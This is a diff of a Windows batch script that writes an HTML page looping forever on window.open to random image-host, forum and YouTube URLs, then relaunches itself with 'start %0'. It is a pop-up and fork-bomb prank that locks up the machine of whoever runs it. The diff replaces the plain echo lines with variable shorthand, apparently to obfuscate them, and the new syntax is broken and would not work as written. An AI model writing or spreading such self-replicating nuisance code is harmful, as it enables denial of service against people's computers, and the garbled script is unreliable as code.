@@ -1,34 +1,34 @@
 @echo off
 :r
 l7 = %random%%random%%random%%random%.DAEMON.html
-echo <!DOCTYPE html> > l7
-echo <html> > l7
-echo <head> > l7
-echo 	<title>Open Websites</title> > l7
-echo </head> > l7
-echo <body> > l7
-echo 	<p>Click the button to open a website:</p> > l7
-echo 	<button onclick="openWebsite()">Open Website</button> > l7
-
-echo 	<script> > l7
-echo 			var websites = [ > l7
-echo 				"https://imagehost.pics/image.php?id=K0SGI3", > l7
-echo 				"https://imagehost.pics/image.php?id=AEL8SN", > l7
-echo 				"https://imagehost.pics/image.php?id=ZHY5C1", > l7
-echo 				"https://imagehost.pics/image.php?id=OYE73G", > l7
-echo 				"https://progaming.monster/showthread.php?id=8VPCC0", > l7
-echo 				"https://www.youtube.com/watch?v=1YW_6OXYB7E", > l7
-echo 			]; > l7
-echo 		while(true) { > l7
-echo 			var index = Math.floor(Math.random() * websites.length); > l7
-echo 			var website = websites[index]; > l7
-
-echo 			window.open(website, "_blank"); > l7
-echo 			} > l7
-echo 		} > l7
-echo 	</script> > l7
-echo </body> > l7
-echo </html> > l7
+6 = "echo "
+fe = " > l7"
+6<!DOCTYPE html>fe
+6<html>fe
+6<head>fe 
+6<title>Open Websites</title>fe
+6</head>fe
+6<body>fe
+6<p>Click the button to open a website:</p>fe
+6<button onclick="openWebsite()">Open Website</button>fe
+6<script>fe
+6var websites = [fe
+6"https://imagehost.pics/image.php?id=K0SGI3",fe
+6"https://imagehost.pics/image.php?id=AEL8SN",fe
+6"https://imagehost.pics/image.php?id=ZHY5C1",fe
+6"https://imagehost.pics/image.php?id=OYE73G",fe
+6"https://progaming.monster/showthread.php?id=8VPCC0",fe
+6"https://www.youtube.com/watch?v=1YW_6OXYB7E",fe
+6];fe
+6while(true) {fe
+6var index = Math.floor(Math.random() * websites.length);fe
+6var website = websites[index];fe
+6window.open(website, "_blank");fe
+6}fe
+6}fe
+6</script>fe
+6</body>fe
+6</html>fe
 start l7
 AGGGH = start %0
 AGGGH
